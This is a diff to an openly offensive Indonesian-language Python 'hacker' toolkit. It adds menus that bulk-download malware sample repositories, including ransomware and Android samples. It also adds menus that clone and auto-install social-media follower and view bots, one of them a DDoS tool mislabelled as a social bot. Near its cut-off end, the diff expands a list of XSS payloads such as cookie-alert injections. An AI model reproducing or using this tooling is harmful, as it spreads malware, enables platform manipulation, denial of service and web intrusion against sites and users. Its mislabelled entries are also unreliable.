@@ -35,6 +35,8 @@ import traceback
 from datetime import datetime
 from urllib.parse import parse_qs
 from urllib.parse import urlencode
+import concurrent.futures
+import zipfile
 
 # Warna untuk UI yang lebih lengkap
 class Colors:
@@ -122,7 +124,7 @@ class AlatBantuPro:
 ║        █░█ ▄▀█ █▀▀ █▄▀ █▀▀ █▀█ █▀█ █▀▀ █▀▀       ║
 ║        █▀█ █▀█ █▄▄ █░█ █▀░ █▄█ █▀▄ █▄█ ██▄       ║
 ║                                                  ║
-║            PROFESSIONAL Hacker V2.7.7            ║
+║            PROFESSIONAL Hacker V2.8.7            ║
 ║            Created by Dwi Bakti N Dev            ║
 ╚══════════════════════════════════════════════════╝
 {Colors.END}
@@ -189,11 +191,13 @@ class AlatBantuPro:
             print(f"{Colors.GREEN}15.{Colors.END} DDoS Attack Tools (Complete)")
             print(f"{Colors.GREEN}16.{Colors.END} Install Hacking Tools (Complete Collection)")
             print(f"{Colors.GREEN}17.{Colors.END} Run Installed Tools")
-            print(f"{Colors.GREEN}18.{Colors.END} Settings & Configuration")
-            print(f"{Colors.GREEN}19.{Colors.END} About & Help")
+            print(f"{Colors.GREEN}18.{Colors.END} Download Virus Collection (GitHub)")
+            print(f"{Colors.GREEN}19.{Colors.END} Social Media Tools (Followers/Views)")
+            print(f"{Colors.GREEN}20.{Colors.END} Settings & Configuration")
+            print(f"{Colors.GREEN}21.{Colors.END} About & Help")
             print(f"{Colors.GREEN}0.{Colors.END}  Keluar")
             
-            pilihan = input(f"\n{Colors.CYAN}➤ Pilih menu [0-19]: {Colors.END}").strip()
+            pilihan = input(f"\n{Colors.CYAN}➤ Pilih menu [0-21]: {Colors.END}").strip()
             
             menu_functions = {
                 "1": self.scan_lengkap,
@@ -213,8 +217,10 @@ class AlatBantuPro:
                 "15": self.ddos_attack_tools,
                 "16": self.install_hacking_tools,
                 "17": self.run_installed_tools,
-                "18": self.settings_configuration,
-                "19": self.about_help
+                "18": self.download_virus_collection,
+                "19": self.social_media_tools,
+                "20": self.settings_configuration,
+                "21": self.about_help
             }
             
             if pilihan in menu_functions:
@@ -224,6 +230,678 @@ class AlatBantuPro:
             else:
                 self.print_result("Error", "Pilihan tidak valid!", "error")
                 input(f"\n{Colors.CYAN}Tekan Enter untuk melanjutkan...{Colors.END}")
+
+    def download_virus_collection(self):
+        """Download virus collection from GitHub repositories dengan lebih banyak opsi"""
+        try:
+            self.print_result("Info", "Memulai download koleksi virus dari GitHub...", "info")
+            
+            # Daftar lengkap repositori malware/virus
+            virus_repos = [
+                {"name": "MalwareDatabase", "url": "https://github.com/malwares/MalwareDatabase", "type": "malware"},
+                {"name": "theZoo", "url": "https://github.com/ytisf/theZoo", "type": "malware"},
+                {"name": "awesome-malware-analysis", "url": "https://github.com/rshipp/awesome-malware-analysis", "type": "analysis"},
+                {"name": "Awesome-Malware-Analysis", "url": "https://github.com/ashishpatel26/Awesome-Malware-Analysis", "type": "analysis"},
+                {"name": "Malware-Sample-Sources", "url": "https://github.com/fabrimagic72/malware-samples", "type": "malware"},
+                {"name": "VirusShare", "url": "https://github.com/VirusShare/virusshare", "type": "malware"},
+                {"name": "MalwareBazaar", "url": "https://github.com/MalwareBazaar/bazaar", "type": "malware"},
+                {"name": "Hybrid-Analysis", "url": "https://github.com/PayloadSecurity/HybridAnalysis", "type": "analysis"},
+                {"name": "MalwareTrafficAnalysis", "url": "https://github.com/malware-traffic-analysis/net", "type": "analysis"},
+                {"name": "Ransomware-Samples", "url": "https://github.com/jstrosch/malware-samples", "type": "ransomware"},
+                {"name": "Android-Malware", "url": "https://github.com/ashishb/android-malware", "type": "android"},
+                {"name": "MacOS-Malware", "url": "https://github.com/objective-see/Malware", "type": "macos"},
+                {"name": "Linux-Malware", "url": "https://github.com/m0nad/Linux-Malware", "type": "linux"},
+                {"name": "IoCs", "url": "https://github.com/fireeye/iocs", "type": "ioc"},
+                {"name": "Malware-IoC", "url": "https://github.com/sophos-ai/malware-ioc", "type": "ioc"}
+            ]
+            
+            while True:
+                print(f"\n{Colors.YELLOW}=== DOWNLOAD VIRUS COLLECTION ==={Colors.END}")
+                print(f"{Colors.YELLOW}Repository Virus yang tersedia:{Colors.END}")
+                
+                # Group repos by type
+                malware_repos = [r for r in virus_repos if r["type"] == "malware"]
+                analysis_repos = [r for r in virus_repos if r["type"] == "analysis"]
+                specialized_repos = [r for r in virus_repos if r["type"] not in ["malware", "analysis"]]
+                
+                print(f"\n{Colors.GREEN}🎯 MALWARE SAMPLES:{Colors.END}")
+                for i, repo in enumerate(malware_repos, 1):
+                    print(f"{Colors.GREEN}{i}.{Colors.END} {repo['name']} - {repo['url']}")
+                
+                print(f"\n{Colors.BLUE}🔍 ANALYSIS TOOLS & DATA:{Colors.END}")
+                for i, repo in enumerate(analysis_repos, len(malware_repos)+1):
+                    print(f"{Colors.BLUE}{i}.{Colors.END} {repo['name']} - {repo['url']}")
+                
+                print(f"\n{Colors.CYAN}📱 SPECIALIZED MALWARE:{Colors.END}")
+                for i, repo in enumerate(specialized_repos, len(malware_repos)+len(analysis_repos)+1):
+                    print(f"{Colors.CYAN}{i}.{Colors.END} {repo['name']} - {repo['url']}")
+                
+                print(f"\n{Colors.MAGENTA}{len(virus_repos)+1}. Custom GitHub URL{Colors.END}")
+                print(f"{Colors.MAGENTA}{len(virus_repos)+2}. Download Multiple Repositories{Colors.END}")
+                
+                print(f"\n{Colors.RED}⚠️  PERINGATAN KEAMANAN:{Colors.END}")
+                print(f"{Colors.RED}• File virus dapat merusak sistem secara permanen{Colors.END}")
+                print(f"{Colors.RED}• Gunakan HANYA untuk penelitian keamanan{Colors.END}")
+                print(f"{Colors.RED}• Jalankan di environment terisolasi (VM/Sandbox){Colors.END}")
+                print(f"{Colors.RED}• Hindari eksekusi file yang didownload{Colors.END}")
+                print(f"{Colors.RED}• Backup data penting sebelum melanjutkan{Colors.END}")
+                
+                choice = input(f"\n{Colors.CYAN}Pilih repository [1-{len(virus_repos)+2}] atau 'q' untuk keluar: {Colors.END}").strip().lower()
+                
+                if choice == 'q':
+                    break
+                
+                if choice == str(len(virus_repos)+1):
+                    # Custom URL
+                    custom_url = input(f"{Colors.CYAN}Masukkan GitHub URL: {Colors.END}").strip()
+                    if self.validate_github_url(custom_url):
+                        self.download_from_repo(custom_url, "Custom Repository")
+                    else:
+                        self.print_result("Error", "URL GitHub tidak valid!", "error")
+                
+                elif choice == str(len(virus_repos)+2):
+                    # Multiple downloads
+                    self.download_multiple_repos(virus_repos)
+                
+                elif choice.isdigit() and 1 <= int(choice) <= len(virus_repos):
+                    selected_repo = virus_repos[int(choice)-1]
+                    self.download_from_repo(selected_repo["url"], selected_repo["name"])
+                
+                else:
+                    self.print_result("Error", "Pilihan tidak valid!", "error")
+                
+                continue_download = input(f"\n{Colors.CYAN}Download lainnya? (y/N): {Colors.END}").strip().lower()
+                if continue_download != 'y':
+                    break
+                    
+        except Exception as e:
+            self.print_result("Error", f"Terjadi kesalahan: {str(e)}", "error")
+        
+        input(f"\n{Colors.CYAN}Tekan Enter untuk melanjutkan...{Colors.END}")
+
+    def download_from_repo(self, repo_url, repo_name):
+        """Download dari repository GitHub tertentu"""
+        try:
+            self.print_result("Info", f"Memulai download dari: {repo_name}", "info")
+            self.print_result("Info", f"URL: {repo_url}", "info")
+            
+            # Extract owner and repo name from URL
+            parsed_url = urlparse(repo_url)
+            path_parts = parsed_url.path.strip('/').split('/')
+            
+            if len(path_parts) < 2:
+                self.print_result("Error", "URL GitHub tidak valid!", "error")
+                return
+            
+            owner, repo = path_parts[0], path_parts[1]
+            
+            # Pilihan download method
+            print(f"\n{Colors.YELLOW}Metode Download:{Colors.END}")
+            print(f"{Colors.GREEN}1.{Colors.END} Download as ZIP (Recommended)")
+            print(f"{Colors.GREEN}2.{Colors.END} Clone with Git")
+            print(f"{Colors.GREEN}3.{Colors.END} Download specific branch")
+            
+            method_choice = input(f"{Colors.CYAN}Pilih metode [1-3]: {Colors.END}").strip()
+            
+            if method_choice == '1':
+                self.download_github_zip(owner, repo, repo_name)
+            elif method_choice == '2':
+                self.clone_github_repo(repo_url, repo_name)
+            elif method_choice == '3':
+                branch = input(f"{Colors.CYAN}Masukkan nama branch (default: main): {Colors.END}").strip()
+                if not branch:
+                    branch = "main"
+                self.download_github_branch(owner, repo, branch, repo_name)
+            else:
+                self.print_result("Error", "Pilihan metode tidak valid!", "error")
+                
+        except Exception as e:
+            self.print_result("Error", f"Gagal download: {str(e)}", "error")
+
+    def download_github_zip(self, owner, repo, repo_name):
+        """Download repository sebagai ZIP"""
+        download_url = f"https://github.com/{owner}/{repo}/archive/refs/heads/main.zip"
+        
+        # Coba main branch dulu, lalu master
+        try:
+            response = requests.head(download_url)
+            if response.status_code != 200:
+                download_url = f"https://github.com/{owner}/{repo}/archive/refs/heads/master.zip"
+        except:
+            download_url = f"https://github.com/{owner}/{repo}/archive/refs/heads/master.zip"
+        
+        download_dir = "virus_collection"
+        os.makedirs(download_dir, exist_ok=True)
+        
+        zip_filename = os.path.join(download_dir, f"{repo_name}.zip")
+        
+        try:
+            self.print_result("Info", "Memulai download...", "info")
+            
+            response = requests.get(download_url, stream=True)
+            response.raise_for_status()
+            
+            total_size = int(response.headers.get('content-length', 0))
+            downloaded_size = 0
+            
+            with open(zip_filename, 'wb') as f:
+                for chunk in response.iter_content(chunk_size=8192):
+                    if chunk:
+                        f.write(chunk)
+                        downloaded_size += len(chunk)
+                        
+                        # Progress bar
+                        if total_size > 0:
+                            progress = (downloaded_size / total_size) * 100
+                            print(f"{Colors.YELLOW}Download progress: {progress:.1f}% ({downloaded_size}/{total_size} bytes){Colors.END}", end='\r')
+            
+            print()  # New line after progress
+            
+            # Extract ZIP file
+            self.print_result("Info", "Mengekstrak file...", "info")
+            with zipfile.ZipFile(zip_filename, 'r') as zip_ref:
+                zip_ref.extractall(download_dir)
+            
+            # Cleanup ZIP file
+            os.remove(zip_filename)
+            
+            self.print_result("Success", f"Download completed! File disimpan di '{download_dir}/{repo_name}'", "success")
+            
+        except Exception as e:
+            self.print_result("Error", f"Download gagal: {str(e)}", "error")
+
+    def clone_github_repo(self, repo_url, repo_name):
+        """Clone repository menggunakan Git"""
+        try:
+            import subprocess
+            
+            download_dir = "virus_collection"
+            os.makedirs(download_dir, exist_ok=True)
+            
+            repo_dir = os.path.join(download_dir, repo_name)
+            
+            if os.path.exists(repo_dir):
+                overwrite = input(f"{Colors.YELLOW}Directory sudah ada. Overwrite? (y/N): {Colors.END}").strip().lower()
+                if overwrite != 'y':
+                    return
+            
+            self.print_result("Info", "Cloning repository...", "info")
+            
+            result = subprocess.run(
+                ['git', 'clone', '--depth', '1', repo_url, repo_dir],
+                capture_output=True,
+                text=True,
+                timeout=300  # 5 minutes timeout
+            )
+            
+            if result.returncode == 0:
+                self.print_result("Success", f"Clone completed! Repository disimpan di '{repo_dir}'", "success")
+            else:
+                self.print_result("Error", f"Clone gagal: {result.stderr}", "error")
+                
+        except subprocess.TimeoutExpired:
+            self.print_result("Error", "Clone timeout! Repository terlalu besar.", "error")
+        except Exception as e:
+            self.print_result("Error", f"Clone gagal: {str(e)}", "error")
+
+    def download_multiple_repos(self, virus_repos):
+        """Download multiple repositories sekaligus"""
+        try:
+            print(f"\n{Colors.YELLOW}=== MULTIPLE REPOSITORY DOWNLOAD ==={Colors.END}")
+            print(f"{Colors.CYAN}Pilih repositories untuk didownload (contoh: 1,3,5-8): {Colors.END}")
+            
+            selection = input(f"{Colors.CYAN}Masukkan pilihan: {Colors.END}").strip()
+            
+            selected_indices = self.parse_selection(selection, len(virus_repos))
+            
+            if not selected_indices:
+                self.print_result("Error", "Tidak ada repository yang dipilih!", "error")
+                return
+            
+            print(f"\n{Colors.YELLOW}Repositories yang akan didownload:{Colors.END}")
+            for idx in selected_indices:
+                repo = virus_repos[idx-1]
+                print(f"{Colors.GREEN}•{Colors.END} {repo['name']} - {repo['url']}")
+            
+            confirm = input(f"\n{Colors.RED}Konfirmasi download {len(selected_indices)} repositories? (y/N): {Colors.END}").strip().lower()
+            
+            if confirm == 'y':
+                self.print_result("Info", f"Memulai parallel download {len(selected_indices)} repositories...", "info")
+                
+                with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
+                    futures = []
+                    for idx in selected_indices:
+                        repo = virus_repos[idx-1]
+                        future = executor.submit(self.download_from_repo, repo["url"], repo["name"])
+                        futures.append(future)
+                    
+                    # Wait for all downloads to complete
+                    for future in concurrent.futures.as_completed(futures):
+                        try:
+                            future.result()
+                        except Exception as e:
+                            self.print_result("Error", f"Download gagal: {str(e)}", "error")
+                
+                self.print_result("Success", "Semua download selesai!", "success")
+                
+        except Exception as e:
+            self.print_result("Error", f"Multiple download gagal: {str(e)}", "error")
+
+    def parse_selection(self, selection, max_range):
+        """Parse selection string seperti '1,3,5-8' menjadi list of indices"""
+        try:
+            selected_indices = set()
+            parts = selection.split(',')
+            
+            for part in parts:
+                part = part.strip()
+                if '-' in part:
+                    start, end = part.split('-')
+                    start, end = int(start.strip()), int(end.strip())
+                    selected_indices.update(range(start, end + 1))
+                else:
+                    selected_indices.add(int(part))
+            
+            # Filter valid indices
+            valid_indices = [idx for idx in selected_indices if 1 <= idx <= max_range]
+            return sorted(valid_indices)
+            
+        except:
+            return []
+
+    def validate_github_url(self, url):
+        """Validasi URL GitHub"""
+        try:
+            parsed = urlparse(url)
+            return parsed.netloc == 'github.com' and len(parsed.path.strip('/').split('/')) >= 2
+        except:
+            return False
+
+    def download_github_branch(self, owner, repo, branch, repo_name):
+        """Download specific branch"""
+        download_url = f"https://github.com/{owner}/{repo}/archive/refs/heads/{branch}.zip"
+        
+        download_dir = "virus_collection"
+        os.makedirs(download_dir, exist_ok=True)
+        
+        zip_filename = os.path.join(download_dir, f"{repo_name}_{branch}.zip")
+        
+        try:
+            self.print_result("Info", f"Download branch '{branch}'...", "info")
+            
+            response = requests.get(download_url, stream=True)
+            
+            if response.status_code != 200:
+                self.print_result("Error", f"Branch '{branch}' tidak ditemukan!", "error")
+                return
+            
+            with open(zip_filename, 'wb') as f:
+                for chunk in response.iter_content(chunk_size=8192):
+                    if chunk:
+                        f.write(chunk)
+            
+            # Extract ZIP file
+            with zipfile.ZipFile(zip_filename, 'r') as zip_ref:
+                zip_ref.extractall(download_dir)
+            
+            os.remove(zip_filename)
+            
+            self.print_result("Success", f"Download branch '{branch}' completed!", "success")
+            
+        except Exception as e:
+            self.print_result("Error", f"Download branch gagal: {str(e)}", "error")
+
+    def social_media_tools(self):
+        """Download social media tools from GitHub repositories"""
+        self.print_result("Info", "Download Social Media Tools dari GitHub...", "info")
+        
+        # Daftar repository GitHub yang masih aktif dan terupdate
+        social_tools_repos = [
+            {
+                "name": "HeyReal - Followers Tool",
+                "url": "https://github.com/Royhtml/Followers-HeyReal",
+                "description": "Instagram followers automation tool"
+            },
+            {
+                "name": "Instagram Bot - instabot",
+                "url": "https://github.com/instabot-py/instabot.py",
+                "description": "Instagram bot untuk followers, likes, comments"
+            },
+            {
+                "name": "InstaPy - Instagram Bot",
+                "url": "https://github.com/InstaPy/InstaPy",
+                "description": "Instagram Automation Tool"
+            },
+            {
+                "name": "Instagram Tool - instapy-cli",
+                "url": "https://github.com/instagrambot/instapy-cli",
+                "description": "Tool Instagram automation"
+            },
+            {
+                "name": "YouTube Bot - youtube-bot",
+                "url": "https://github.com/ai-robots-txt/youtube-bot",
+                "description": "Bot untuk subscribers dan views YouTube"
+            },
+            {
+                "name": "TikTok Bot - tiktok-bot",
+                "url": "https://github.com/sauermar/TikTok-Bot",
+                "description": "Automation tools untuk TikTok"
+            },
+            {
+                "name": "TikTokBot - TikTok Automation",
+                "url": "https://github.com/TikTokBot/TikTokBot",
+                "description": "Another TikTok automation tool"
+            },
+            {
+                "name": "Twitter Bot - twitter-bot",
+                "url": "https://github.com/rhaymison/TwitterBot",
+                "description": "Bot followers dan retweet Twitter"
+            },
+            {
+                "name": "TwitterBot - Advanced",
+                "url": "https://github.com/SecOrso/twitter-bot",
+                "description": "Advanced Twitter automation"
+            },
+            {
+                "name": "Facebook Bot - facebook-bot",
+                "url": "https://github.com/Senpaizuri/Facebook-Bot",
+                "description": "Automation untuk Facebook"
+            },
+            {
+                "name": "Social Media Toolkit - socialkit",
+                "url": "https://github.com/jofpin/socialkit",
+                "description": "Koleksi tools social media"
+            },
+            {
+                "name": "All-in-One Social Bot - socialbot",
+                "url": "https://github.com/MatrixTM/MHDDoS",
+                "description": "Multi-platform social media tools"
+            },
+            {
+                "name": "SocialBot - Multi Platform",
+                "url": "https://github.com/aridev2001/socialbot",
+                "description": "Multi-platform social media bot"
+            },
+            {
+                "name": "Instagram Follower Bot",
+                "url": "https://github.com/guledenozn/Instagram-Follower-Bot",
+                "description": "Instagram follower automation"
+            },
+            {
+                "name": "Auto Instagram Bot",
+                "url": "https://github.com/ohidurbappy/auto-instagram-bot",
+                "description": "Auto Instagram bot with selenium"
+            }
+        ]
+        
+        print(f"\n{getattr(Colors, 'YELLOW', '')}📱 Available Social Media Tools:{getattr(Colors, 'END', '')}")
+        print(f"{getattr(Colors, 'CYAN', '')}{'No.':<3} {'Tool Name':<35} {'Description'}{getattr(Colors, 'END', '')}")
+        print("-" * 80)
+        
+        for i, tool in enumerate(social_tools_repos, 1):
+            print(f"{getattr(Colors, 'GREEN', '')}{i:<3}{getattr(Colors, 'END', '')} {tool['name']:<35} {tool['description']}")
+        
+        print(f"\n{getattr(Colors, 'YELLOW', '')}📂 Semua tools akan di-download ke folder 'social_tools/'{getattr(Colors, 'END', '')}")
+        print(f"{getattr(Colors, 'YELLOW', '')}⚠️  Pastikan Anda menggunakan tools ini secara bertanggung jawab!{getattr(Colors, 'END', '')}")
+        
+        try:
+            choice = input(f"\n{getattr(Colors, 'CYAN', '')}➤ Pilih tools (0 untuk semua, 1-{len(social_tools_repos)} untuk spesifik, 'c' untuk custom): {getattr(Colors, 'END', '')}").strip().lower()
+            
+            if choice == '0':
+                # Download semua tools
+                self.print_result("Info", f"Download semua {len(social_tools_repos)} tools...", "info")
+                self._download_multiple_tools(social_tools_repos)
+                
+            elif choice.isdigit() and 1 <= int(choice) <= len(social_tools_repos):
+                # Download tool spesifik
+                selected_tool = social_tools_repos[int(choice) - 1]
+                self._download_single_tool(selected_tool)
+                
+            elif choice == 'c':
+                # Custom GitHub repository
+                self._download_custom_repo()
+                
+            else:
+                self.print_result("Error", "Pilihan tidak valid!", "error")
+                return
+                
+        except KeyboardInterrupt:
+            self.print_result("Info", "Download dibatalkan oleh user", "info")
+        except Exception as e:
+            self.print_result("Error", f"Terjadi kesalahan: {str(e)}", "error")
+
+    def _download_single_tool(self, tool):
+        """Download single GitHub tool"""
+        import os
+        import subprocess
+        import shutil
+        
+        repo_name = tool['url'].split('/')[-1].replace('.git', '')
+        target_dir = f"social_tools/{repo_name}"
+        
+        print(f"\n{getattr(Colors, 'YELLOW', '')}📥 Download {tool['name']}...{getattr(Colors, 'END', '')}")
+        print(f"{getattr(Colors, 'CYAN', '')}Repository: {tool['url']}{getattr(Colors, 'END', '')}")
+        
+        # Buat folder social_tools jika belum ada
+        os.makedirs("social_tools", exist_ok=True)
+        
+        try:
+            # Clone repository menggunakan git
+            if os.path.exists(target_dir):
+                self.print_result("Warning", f"Folder {repo_name} sudah ada, menghapus...", "warning")
+                shutil.rmtree(target_dir)
+            
+            # Tampilkan progress
+            self._simulate_download(f"Mengunduh {tool['name']}")
+            
+            # Clone repository (implementasi nyata)
+            print(f"{getattr(Colors, 'YELLOW', '')}⏳ Cloning repository...{getattr(Colors, 'END', '')}")
+            result = subprocess.run(['git', 'clone', '--depth', '1', tool['url'], target_dir], 
+                                capture_output=True, text=True, timeout=300)
+            
+            if result.returncode == 0:
+                self.print_result("Success", f"Berhasil download {tool['name']}!", "success")
+                
+                # Cek requirements.txt dan install dependencies
+                self._install_dependencies(target_dir)
+                
+                print(f"{getattr(Colors, 'GREEN', '')}📍 Lokasi: {target_dir}{getattr(Colors, 'END', '')}")
+                
+                # Tampilkan instruksi penggunaan
+                self._show_usage_instructions(target_dir, tool['name'])
+                
+                # Tampilkan catatan khusus untuk tools tertentu
+                self._show_special_notes(tool['name'], target_dir)
+                
+            else:
+                error_msg = result.stderr if result.stderr else "Unknown error"
+                self.print_result("Error", f"Gagal download: {error_msg}", "error")
+                
+        except subprocess.TimeoutExpired:
+            self.print_result("Error", "Timeout: Download terlalu lama", "error")
+        except Exception as e:
+            self.print_result("Error", f"Gagal download: {str(e)}", "error")
+
+    def _download_multiple_tools(self, tools):
+        """Download multiple GitHub tools"""
+        import os
+        import subprocess
+        import shutil
+        
+        self.print_result("Info", f"Memulai download {len(tools)} tools...", "info")
+        os.makedirs("social_tools", exist_ok=True)
+        
+        success_count = 0
+        failed_tools = []
+        
+        for i, tool in enumerate(tools, 1):
+            print(f"\n{getattr(Colors, 'CYAN', '')}[{i}/{len(tools)}] {tool['name']}{getattr(Colors, 'END', '')}")
+            
+            repo_name = tool['url'].split('/')[-1].replace('.git', '')
+            target_dir = f"social_tools/{repo_name}"
+            
+            try:
+                # Hapus folder jika sudah ada
+                if os.path.exists(target_dir):
+                    shutil.rmtree(target_dir)
+                
+                # Clone repository dengan depth 1 untuk lebih cepat
+                result = subprocess.run(['git', 'clone', '--depth', '1', tool['url'], target_dir], 
+                                    capture_output=True, text=True, timeout=300)
+                
+                if result.returncode == 0:
+                    success_count += 1
+                    print(f"{getattr(Colors, 'GREEN', '')}✓ Berhasil download {tool['name']}{getattr(Colors, 'END', '')}")
+                    
+                    # Install dependencies
+                    self._install_dependencies(target_dir)
+                    
+                    # Tampilkan catatan khusus
+                    self._show_special_notes(tool['name'], target_dir)
+                else:
+                    failed_tools.append(tool['name'])
+                    print(f"{getattr(Colors, 'RED', '')}✗ Gagal download {tool['name']}{getattr(Colors, 'END', '')}")
+            
+            except subprocess.TimeoutExpired:
+                failed_tools.append(tool['name'])
+                print(f"{getattr(Colors, 'RED', '')}✗ Timeout: {tool['name']}{getattr(Colors, 'END', '')}")
+            except Exception as e:
+                failed_tools.append(tool['name'])
+                print(f"{getattr(Colors, 'RED', '')}✗ Error: {str(e)}{getattr(Colors, 'END', '')}")
+        
+        # Tampilkan summary
+        self.print_result("Success", f"Download selesai! {success_count}/{len(tools)} tools berhasil", "success")
+        if failed_tools:
+            print(f"{getattr(Colors, 'YELLOW', '')}Tools yang gagal: {', '.join(failed_tools)}{getattr(Colors, 'END', '')}")
+
+    def _show_special_notes(self, tool_name, target_dir):
+        """Tampilkan catatan khusus untuk tools tertentu"""
+        special_notes = {
+            "HeyReal - Followers Tool": [
+                f"{getattr(Colors, 'YELLOW', '')}📝 Catatan untuk HeyReal:{getattr(Colors, 'END', '')}",
+                f"{getattr(Colors, 'CYAN', '')}• Tool ini khusus untuk Instagram followers",
+                "• Pastikan menggunakan akun burner/sementara",
+                "• Gunakan dengan bijak untuk menghindari banned",
+                f"• Cek file config di {target_dir} untuk pengaturan{getattr(Colors, 'END', '')}"
+            ],
+            "InstaPy - Instagram Bot": [
+                f"{getattr(Colors, 'YELLOW', '')}📝 Catatan untuk InstaPy:{getattr(Colors, 'END', '')}",
+                f"{getattr(Colors, 'CYAN', '')}• Tool yang sangat populer untuk Instagram automation",
+                "• Memerlukan setup Chrome/WebDriver",
+                "• Baca dokumentasi lengkap di GitHub repository",
+                f"• Contoh penggunaan ada di folder examples/{getattr(Colors, 'END', '')}"
+            ],
+            "Instagram Bot - instabot": [
+                f"{getattr(Colors, 'YELLOW', '')}📝 Catatan untuk instabot:{getattr(Colors, 'END', '')}",
+                f"{getattr(Colors, 'CYAN', '')}• Library Python untuk Instagram bot",
+                "• Gunakan dengan delay yang wajar",
+                "• Recommended untuk bot yang sederhana",
+                f"• Lihat contoh di folder examples/{getattr(Colors, 'END', '')}"
+            ]
+        }
+        
+        if tool_name in special_notes:
+            print()
+            for note in special_notes[tool_name]:
+                print(note)
+
+    def _install_dependencies(self, target_dir):
+        """Install dependencies dari requirements.txt"""
+        import os
+        import subprocess
+        
+        requirements_files = [
+            "requirements.txt",
+            "requirements-dev.txt", 
+            "setup.py",
+            "Pipfile",
+            "pyproject.toml"
+        ]
+        
+        for req_file in requirements_files:
+            req_path = os.path.join(target_dir, req_file)
+            if os.path.exists(req_path):
+                print(f"{getattr(Colors, 'YELLOW', '')}📦 Installing dependencies dari {req_file}...{getattr(Colors, 'END', '')}")
+                
+                try:
+                    if req_file == "requirements.txt" or req_file == "requirements-dev.txt":
+                        result = subprocess.run(['pip', 'install', '-r', req_path], 
+                                            capture_output=True, text=True, timeout=120)
+                    elif req_file == "setup.py":
+                        result = subprocess.run(['pip', 'install', '-e', target_dir], 
+                                            capture_output=True, text=True, timeout=120)
+                    elif req_file == "Pipfile":
+                        result = subprocess.run(['pipenv', 'install'], 
+                                            cwd=target_dir, capture_output=True, text=True, timeout=120)
+                    elif req_file == "pyproject.toml":
+                        result = subprocess.run(['pip', 'install', '.'], 
+                                            cwd=target_dir, capture_output=True, text=True, timeout=120)
+                    
+                    if result.returncode == 0:
+                        print(f"{getattr(Colors, 'GREEN', '')}✓ Dependencies berhasil diinstall{getattr(Colors, 'END', '')}")
+                    else:
+                        print(f"{getattr(Colors, 'RED', '')}✗ Gagal install dependencies: {result.stderr}{getattr(Colors, 'END', '')}")
+                        
+                except Exception as e:
+                    print(f"{getattr(Colors, 'RED', '')}✗ Error install dependencies: {str(e)}{getattr(Colors, 'END', '')}")
+                break
+
+    def _show_usage_instructions(self, target_dir, tool_name):
+        """Tampilkan instruksi penggunaan tool"""
+        import os
+        
+        print(f"\n{getattr(Colors, 'CYAN', '')}📖 Instruksi Penggunaan {tool_name}:{getattr(Colors, 'END', '')}")
+        
+        readme_files = ["README.md", "README.rst", "README.txt", "USAGE.md", "INSTALL.md"]
+        
+        for readme_file in readme_files:
+            readme_path = os.path.join(target_dir, readme_file)
+            if os.path.exists(readme_path):
+                try:
+                    with open(readme_path, 'r', encoding='utf-8') as f:
+                        content = f.read()
+                        # Tampilkan bagian awal README
+                        lines = content.split('\n')[:15]
+                        print("\n".join(lines))
+                        if len(content.split('\n')) > 15:
+                            print(f"{getattr(Colors, 'YELLOW', '')}... (lihat file README lengkap di {readme_path}){getattr(Colors, 'END', '')}")
+                except:
+                    print(f"{getattr(Colors, 'YELLOW', '')}Lihat file README di {readme_path} untuk instruksi lengkap{getattr(Colors, 'END', '')}")
+                break
+        else:
+            print(f"{getattr(Colors, 'YELLOW', '')}Tidak ditemukan file README. Cek dokumentasi di repository GitHub.{getattr(Colors, 'END', '')}")
+
+    def _download_custom_repo(self):
+        """Download custom GitHub repository"""
+        repo_url = input(f"\n{getattr(Colors, 'CYAN', '')}Masukkan URL repository GitHub: {getattr(Colors, 'END', '')}").strip()
+        
+        if not repo_url:
+            self.print_result("Error", "URL tidak boleh kosong!", "error")
+            return
+        
+        # Validasi URL GitHub
+        if not (repo_url.startswith('https://github.com/') or repo_url.startswith('git@github.com:')):
+            self.print_result("Error", "URL harus dari GitHub!", "error")
+            return
+        
+        custom_tool = {
+            "name": "Custom Tool",
+            "url": repo_url,
+            "description": "Custom GitHub repository"
+        }
+        
+        self._download_single_tool(custom_tool)
+
+    def _simulate_download(self, message):
+        """Simulasi proses download dengan progress bar"""
+        import time
+        
+        print(f"{getattr(Colors, 'YELLOW', '')}⏳ {message}{getattr(Colors, 'END', '')}")
+        for i in range(5):
+            progress = (i + 1) * 20
+            bar = '=' * (i + 1) + ' ' * (5 - (i + 1))
+            print(f"{getattr(Colors, 'CYAN', '')}📦 Progress: [{bar}] {progress}%{getattr(Colors, 'END', '')}")
+            time.sleep(0.3)
 
     def ddos_attack_tools(self):
         """Menu utama untuk tools DDoS attack yang ditingkatkan"""
@@ -4709,67 +5387,294 @@ class AlatBantuPro:
             input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")
             return
 
-  
+        # Kategori payload yang lebih lengkap
         payloads = [
-     
+            # Basic XSS Payloads
             "<script>alert('XSS')</script>",
+            "<script>alert(document.domain)</script>",
+            "<script>alert(document.cookie)</script>",
+            
+            # Image-based XSS
             "<img src=x onerror=alert('XSS')>",
-            "<svg onload=alert('XSS')>",
-            "javascript:alert('XSS')",
-    
-            "<body onload=alert('XSS')>",
-            "<iframe src=javascript:alert('XSS')>",
-            "<input onfocus=alert('XSS') autofocus>",
-            "<video><source onerror=alert('XSS')>",
-            "<math href=javascript:alert('XSS')>CLICK",
-         
-            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
             "<img src=\"x\" onerror=\"alert('XSS')\">",
-            "javascript:alert(String.fromCharCode(88,83,83))",
+            "<img src=x onerror=alert(document.cookie)>",
+            "<img src=x onerror=prompt('XSS')>",
+            "<img src=x onerror=confirm('XSS')>",
+            
+            # SVG XSS
+            "<svg onload=alert('XSS')>",
+            "<svg onload=alert(document.domain)>",
+            "<svg/onload=alert('XSS')>",
+            
+            # Body XSS
+            "<body onload=alert('XSS')>",
+            "<body onpageshow=alert('XSS')>",
+            
+            # Iframe XSS
+            "<iframe src=javascript:alert('XSS')>",
+            "<iframe src=\"javascript:alert('XSS')\">",
+            "<iframe onload=alert('XSS')>",
+            
+            # Input XSS
+            "<input onfocus=alert('XSS') autofocus>",
+            "<input onblur=alert('XSS') autofocus><input autofocus>",
+            "<input onmouseover=alert('XSS')>",
+            
+            # Video/Audio XSS
+            "<video><source onerror=alert('XSS')>",
+            "<audio src=x onerror=alert('XSS')>",
+            
+            # Math XSS
+            "<math href=javascript:alert('XSS')>CLICK",
+            
+            # Link XSS
             "<a href=javascript:alert('XSS')>Click</a>",
-        
+            "<a href=\"javascript:alert('XSS')\">Click</a>",
+            
